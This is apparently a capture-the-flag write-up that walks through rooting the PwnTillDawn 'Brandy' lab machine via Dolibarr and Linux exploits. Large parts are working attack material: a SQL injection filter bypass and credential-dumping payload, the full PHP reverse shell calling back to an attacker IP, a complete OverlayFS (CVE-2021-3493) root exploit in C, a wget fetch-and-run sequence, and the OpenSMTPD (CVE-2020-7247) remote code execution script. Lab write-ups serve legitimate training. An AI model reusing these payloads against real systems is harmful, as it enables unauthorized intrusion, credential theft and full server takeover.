---
layout: post
title:  "PwnTillDawn - Brandy (Difficult)"
description: A PwnTillDawn Boot2Root Challenge Rated Difficult
tags: PwnTillDawn Linux Boot2Root Difficult
media_subpath: /assets/img/writeups/PwnTillDawn/Brandy/
image:
  path: Brandy.png
---

## At a glance

| Item                 | Details       |
| -------------------- | ------------- |
| **Type**             | Boot2Root     |
| **Difficulty**       | Difficult     |
| **IP Address**       | 10.150.150.27 |
| **Operating System** | Linux         |

## Recon

* **Passive**: tech stack, endpoints, robots, JS routes, third‑party assets
* **Active**: directory brute‑force, API discovery, parameter mining

```bash
# Check for any open port
nmap 10.150.150.27
```

![Nmap Result](nmap.png)

Shows SSH and HTTP port open.

```bash
# Check for any common directories
dirsearch -u http://10.150.150.27
```

![Dirsearch Result](dirsearch.png)

From this result there are two accesible path:

  - `/cart/`{: .filepath}
  - `/master/`{: .filepath}

1. `/cart/`{: .filepath}

    ![Cart Path Result](cart.png)

    From this result we retrive the first flag and domain for the IP which is `crm.pwntilldawn.com`.

    > **FLAG61=2971f3459fe55db1237aad5e0f0a259a41633962**

2. `/master/`{: .filepath}

    ![Master Path Result](master.png)

    For the second path, we know that the creator always use **rick** for everything. So we figure out that **rick** is common username and password for this challenge.

## Web Exploitation

To start with the web exploitation, we first need to add the ip and domain into hosts file.

```bash
# Add domain into hosts file
echo 10.150.150.27 crm.pwntilldawn.com >> hosts
```

Here is the web application that attached to the domain.

![Dolibarr Login Page](Dolibarr_login.png)

From this login page we can determine the product including the verion.

### Dolibarr 5.0.3

> Always remember, check **CVE** for any product you found!
{: .prompt-tip }

From that version, we list all CVE that related to this challenge for this version.

1. **CVE 2017-9840** 
: Insecure file upload on low-privilege users, lead to arbitrary code execution.
2. **CVE 2017-18260** 
: Multiple SQL Injection in `comm/propal/list.php`{: .filepath} (`viewstatut`, `propal_statut/search_statut`)

After that we can directly login using **rick:rick**.

![Dolibarr Dashboard Page](Dolibarr_dashboard.png)

From this path, we perform some recon on the website, then we figure that both vulnerability can be exploited through this user.

### CVE 2017-18260 - SQL Injection

To exploit this CVE, we need to ensure that the user has access to `comm/propal/list.php`{: .filepath}. We can check it through `User permissions`{: .filepath} path

![Dolibarr User Permission Page](Dolibarr_Rick_Priv.png)

After we access the path, we actually retrieve the second flag.

![Dolibarr Propal List Page](Dolibarr_propal_list.png)

> **FLAG62=543d3e087a6764fbeb3d42f58c59b78e201e7f69**

In this path, there are SQL Injection on two parameter.

1. **GET Method** at `viewstatut`

    ![Dolibarr SQLI GET](Dolibarr_SQL_GET.png)

2. **POST Method** at `propal_statut`

    ![Dolibarr SQLI POST](Dolibarr_SQL_POST.png)
 
    ![Dolibarr SQLI POST res](Dolibarr_SQL_POST_res.png)

From here we can choose either one to perform **SQL Injection**. In this case, we choose **POST request** as it easy to simulate.

For stater, we already know that there are **29 column** in the select statement when we read the **SQL Query** in the **Debug Error**.

Then we try to proceed with **Union-Based SQLi** but we encounter some **SQLi Protection**.

![Dolibarr SQLI Fail](Dolibarr_SQL_Fail.png)

From this notification, we try to figure out how to bypass the protection. Many style we already use to bypass it but only one way successful.

#### SQLi Bypass Protection

Our thought process comes from here

1. How the detection works?

    | Payload            | Status  |
    | ------------------ | ------- |
    | **%union%**        | Success |
    | **%select%**       | Success |
    | **%from%**         | Success |
    | **%select%from%**  | Fail    |
    | **%union%select%** | Fail    |

2. How to bypass the fail item?

    | Payload                                                     | Status  |
    | ----------------------------------------------------------- | ------- |
    | **Randomcase** (`SelECT`)                                   | Fail    |
    | **space to comment** (`union/\*\*/select`)                  | Fail    |
    | **Versioned (conditional) comment** (`/\*!select/\*\*/\*/`) | Fail    |
    | **Space to newline** (`union%0aselect`)                     | Success |

> Always figure out how the detection work before try to bypass it.
{: .prompt-tip }

Now we can perform our SQLi without any issue. From this point our target has been only one. **New user** with another privilege.

As this is a product, we can directly search for the database layout online to ease the data retrieval process. Our target will be list below.

- **Table** - *llx_user*
- **Collumns** - *login*, *pass*, *pass_crypted*, *pass_temp*

So to start exploiting the Union-Based SQLi, we need to determine which of the 28 column will be appear on the web application.

![Dolibarr SQL Union Check](Dolibarr_SQL_Union_Check.png)

From this result, the web shows that we can inject on column ***18,19,2,3,4,13,28***

Then we directly retrieve other username and password using the payload below.

```sql
0)union%0a
select 1,pass,pass_crypted,pass_temp,5,6,7,8,9,10,11,12,13,14,15,16,17,18,login,20,21,22,23,24,25,26,27,28%0a
from llx_user-- -
```
{: file='SQL Injection Payload'}

![Dolibarr SQL Union Ret](Dolibarr_SQL_Union_Ret.png)

From the result, this shows that only pass_crypted is available. Then we proceed to try crack the MD5 hash for **admin** and **cliff** user. In this cases, we proceed to use [CrackStation](https://crackstation.net/).

![Crackstation Result](CrackStation.png)

Then we proceed to login with **cliff:donation**.

![Cliff Dashboard](Dolibarr_Cliff.png)

After login, we directly retrieve the third flag.

> **FLAG63=4eedbe365eede0a18ab90b63c209284dd653add9**

After we play around with the user, we also directly found the next flag through **Donation** path.

![Dolibarr Donation](Dolibarr_Donation.png)

> **FLAG64=6bf7c50b228c4672b590615b5cbcb73bb44614fd**

Then we proceed to the next vulnerability.

### CVE 2017-9840

Actually, I think this is the intended vulnerability for this challenge but then, I figure there are other CVE that can be exploited by rick user to perform arbitrary code execution.

> Why this is the intended way?
> Unauthorized -> Authorized as Rick -> SQL Injection -> Authorized as Cliff -> Insecure File Upload -> Arbitrary Code Execution.
{: .prompt-info }

Here is couple of way to do it.

1. Maybe Intended Way `don/document.php`{: .filepath}

    ![Dolibarr IFU Don](Dolibarr_IFU_Don.png)

    After upload a `.php` file, it will add a new extension: `.noexe` after current extention. Then we proceed to rename it by removing `.noexe` from the filename.

    ![Dolibarr IFU Rename](Dolibarr_IFU_Rename.png)

    After we rename, we can directly open the file through this directory: `/documents/don/{filename}`{: .filepath}.

    ![Dolibarr IFU Don Suc](Dolibarr_IFU_Don_Suc.png)

2. Other Way `user/document.php`{: .filepath}

    ![Dolibarr IFU Profile](Dolibarr_IFU_Profile.png)

    Even when you see the button is disabled, just remove the disable tag through inspect element only if you are too lazy to craft the request.

    ![Dolibarr IFU Profile Ins](Dolibarr_IFU_Profile_Ins.png)

    Then, I directly upload a `.phar` file.

    ![Dolibarr IFU Profile Upl](Dolibarr_IFU_Profile_Upl.png)

    Then, we can open the file through this directory: `/documents/users/2/test.phar`{: .filepath}.

    ![Dolibarr IFU Profile Suc](Dolibarr_IFU_Profile_Suc.png)

> Tip! Always check if the application use whitelisting or blacklisting method for file upload filter extension. Common and easy way is through random extension `.dada`
{: .prompt-tip }

## Foothold (Initial Access)

From either way, you can directly perform reverse shell. I always refer to this whenever I want to do reverse shell [RevShells](https://www.revshells.com/). In this case, I just use PHP PentestMonkey Payload.

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = 'IP';
$port = PORT;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}
?>
```

After we setup listener, we can get a shell to the server.

![Reverse Shell Successful](Reverse_Shell_Successful.png)

Then we proceed with shell stabilization.

![Stable Shell](Stable_Shell.png)

From the shell, we can retrieve the next flag in the web application folder.

![Flag 65](Shell_Flag65.png)

> **FLAG65=185d65d0fd6049385ab53eae8be28b2c79023bc2**

## Privilege Escalation

To proceed with privilege escalation, there are many vulnerability available. Probably due this an old challenge. So as always, start with recon on the server to know which vulnerability to be exploited. Below is two of the vulnerability I found.

1. **CVE 2021-3493** Ubuntu OverlayFS Local Privesc

    Affected Version
    - Ubuntu 20.10
    - Ubuntu 20.04 LTS
    - Ubuntu 19.04
    - Ubuntu 18.04 LTS
    - Ubuntu 16.04 LTS
    - Ubuntu 14.04 ESM

    Fixed in **Linux 5.11**

    For this CVE, we need to check two things to ensure that this is vulnerable.

    ```bash
    uname -r
    cat /proc/sys/kernel/unprivileged_userns_clone
    ```

    ![CVE 2021 3493](CVE_2021_3493check.png)

    From this picture we can proceed to exploit the vulnerability. Refer to [this](https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/) for explanation and PoC.

    Here is the code for the PoC.

    ```c
    #define _GNU_SOURCE
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <unistd.h>
    #include <fcntl.h>
    #include <err.h>
    #include <errno.h>
    #include <sched.h>
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <sys/wait.h>
    #include <sys/mount.h>
    //#include <attr/xattr.h>
    //#include <sys/xattr.h>
    int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);
    #define DIR_BASE    "./ovlcap"
    #define DIR_WORK    DIR_BASE "/work"
    #define DIR_LOWER   DIR_BASE "/lower"
    #define DIR_UPPER   DIR_BASE "/upper"
    #define DIR_MERGE   DIR_BASE "/merge"
    #define BIN_MERGE   DIR_MERGE "/magic"
    #define BIN_UPPER   DIR_UPPER "/magic"
    static void xmkdir(const char *path, mode_t mode)
    {
        if (mkdir(path, mode) == -1 && errno != EEXIST)
            err(1, "mkdir %s", path);
    }
    static void xwritefile(const char *path, const char *data)
    {
        int fd = open(path, O_WRONLY);
        if (fd == -1)
            err(1, "open %s", path);
        ssize_t len = (ssize_t) strlen(data);
        if (write(fd, data, len) != len)
            err(1, "write %s", path);
        close(fd);
    }
    static void xcopyfile(const char *src, const char *dst, mode_t mode)
    {
        int fi, fo;
        if ((fi = open(src, O_RDONLY)) == -1)
            err(1, "open %s", src);
        if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1)
            err(1, "open %s", dst);
        char buf[4096];
        ssize_t rd, wr;
        for (;;) {
            rd = read(fi, buf, sizeof(buf));
            if (rd == 0) {
                break;
            } else if (rd == -1) {
                if (errno == EINTR)
                    continue;
                err(1, "read %s", src);
            }
            char *p = buf;
            while (rd > 0) {
                wr = write(fo, p, rd);
                if (wr == -1) {
                    if (errno == EINTR)
                        continue;
                    err(1, "write %s", dst);
                }
                p += wr;
                rd -= wr;
            }
        }
        close(fi);
        close(fo);
    }
    static int exploit()
    {
        char buf[4096];
        sprintf(buf, "rm -rf '%s/'", DIR_BASE);
        system(buf);
        xmkdir(DIR_BASE, 0777);
        xmkdir(DIR_WORK,  0777);
        xmkdir(DIR_LOWER, 0777);
        xmkdir(DIR_UPPER, 0777);
        xmkdir(DIR_MERGE, 0777);
        uid_t uid = getuid();
        gid_t gid = getgid();
        if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)
            err(1, "unshare");
        xwritefile("/proc/self/setgroups", "deny");
        sprintf(buf, "0 %d 1", uid);
        xwritefile("/proc/self/uid_map", buf);
        sprintf(buf, "0 %d 1", gid);
        xwritefile("/proc/self/gid_map", buf);
        sprintf(buf, "lowerdir=%s,upperdir=%s,workdir=%s", DIR_LOWER, DIR_UPPER, DIR_WORK);
        if (mount("overlay", DIR_MERGE, "overlay", 0, buf) == -1)
            err(1, "mount %s", DIR_MERGE);
        // all+ep
        char cap[] = "\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00";
        xcopyfile("/proc/self/exe", BIN_MERGE, 0777);
        if (setxattr(BIN_MERGE, "security.capability", cap, sizeof(cap) - 1, 0) == -1)
            err(1, "setxattr %s", BIN_MERGE);
        return 0;
    }
    int main(int argc, char *argv[])
    {
        if (strstr(argv[0], "magic") || (argc > 1 && !strcmp(argv[1], "shell"))) {
            setuid(0);
            setgid(0);
            execl("/bin/bash", "/bin/bash", "--norc", "--noprofile", "-i", NULL);
            err(1, "execl /bin/bash");
        }
        pid_t child = fork();
        if (child == -1)
            err(1, "fork");
        if (child == 0) {
            _exit(exploit());
        } else {
            waitpid(child, NULL, 0);
        }
        execl(BIN_UPPER, BIN_UPPER, "shell", NULL);
        err(1, "execl %s", BIN_UPPER);
    }
    ```

    You can use any way to insert the script into the server. In my case, I use python to host the file. Then compile and run the application to escalate into root user.

    ```bash
    # Attacker
    python -m http.server 80

    # Victim
    wget http://{IP}/exploit.c
    gcc exploit.c -o exploit
    ./exploit
    ```

    ![CVE 2021 3493 Suc](CVE_2021_3493_Suc.png)

2. **CVE 2020-7247** OpenSMTPD 6.6.1 - Remote Code Execution

    For this vulnerability, we figure out from checking the listening port.

    ```bash
    netstat -tulnp
    ```

    ![Netstat command](Netstat_command.png)

    After we found new port `25` listen locally, we try to check on it content and perform some recon.

    ```bash
    nc 127.0.0.1 25
    smtpd -h
    ```

    ![OpenSMTPD Version](OpenSMTPD_Version.png)

    From that version, we found that it vulnerable to **CVE 2020-7247** which can execute command through root user. Then we proceed to the next step. As the port only listen locally, we proceed to forward the port to our local using **ssh**.

    ```bash
    ssh -L {port}:127.0.0.1:25 {user}@{host}
    ```

    ![Port Forward](Port_Forward.png)

    After done forwarding, we use the exploit. In my case, first I try the script from [Exploit-DB](https://www.exploit-db.com/exploits/47984) but something going wrong when I try to spawn a shell. Maybe some error in my command. Then I proceed to use metasploit `exploit/unix/smtp/opensmtpd_mail_from_rce`.

    ```python
    # Exploit Title: OpenSMTPD 6.6.1 - Remote Code Execution
    # Date: 2020-01-29
    # Exploit Author: 1F98D
    # Original Author: Qualys Security Advisory
    # Vendor Homepage: https://www.opensmtpd.org/
    # Software Link: https://github.com/OpenSMTPD/OpenSMTPD/releases/tag/6.6.1p1
    # Version: OpenSMTPD < 6.6.2
    # Tested on: Debian 9.11 (x64)
    # CVE: CVE-2020-7247
    # References:
    # https://www.openwall.com/lists/oss-security/2020/01/28/3
    #
    # OpenSMTPD after commit a8e222352f and before version 6.6.2 does not adequately
    # escape dangerous characters from user-controlled input. An attacker
    # can exploit this to execute arbitrary shell commands on the target.
    # 
    #!/usr/local/bin/python3

    from socket import *
    import sys

    if len(sys.argv) != 4:
        print('Usage {} <target ip> <target port> <command>'.format(sys.argv[0]))
        print("E.g. {} 127.0.0.1 25 'touch /tmp/x'".format(sys.argv[0]))
        sys.exit(1)

    ADDR = sys.argv[1]
    PORT = int(sys.argv[2])
    CMD = sys.argv[3]

    s = socket(AF_INET, SOCK_STREAM)
    s.connect((ADDR, PORT))

    res = s.recv(1024)
    if 'OpenSMTPD' not in str(res):
        print('[!] No OpenSMTPD detected')
        print('[!] Received {}'.format(str(res)))
        print('[!] Exiting...')
        sys.exit(1)

    print('[*] OpenSMTPD detected')
    s.send(b'HELO x\r\n')
    res = s.recv(1024)
    if '250' not in str(res):
        print('[!] Error connecting, expected 250')
        print('[!] Received: {}'.format(str(res)))
        print('[!] Exiting...')
        sys.exit(1)

    print('[*] Connected, sending payload')
    s.send(bytes('MAIL FROM:<;{};>\r\n'.format(CMD), 'utf-8'))
    res = s.recv(1024)
    if '250' not in str(res):
        print('[!] Error sending payload, expected 250')
        print('[!] Received: {}'.format(str(res)))
        print('[!] Exiting...')
        sys.exit(1)

    print('[*] Payload sent')
    s.send(b'RCPT TO:<root>\r\n')
    s.recv(1024)
    s.send(b'DATA\r\n')
    s.recv(1024)
    s.send(b'\r\nxxx\r\n.\r\n')
    s.recv(1024)
    s.send(b'QUIT\r\n')
    s.recv(1024)
    print('[*] Done')
    ```

    Above is the script for the exploit and below is the one when I use metasploit.

    ![Metasploit root](Metasploit_root.png)

## Last Flag

After all of that, just read the flag at `/root/FLAG66`{: .filepath}

![Last Flag](Last_Flag.png)

> **FLAG66=e075fab32dea389109b4a0023ffe9b4fb87d2feb**

Overall This is my first PwnTillDawn Challenge. Quite tricky. Get to learn a lot from this. More Challenge to go.
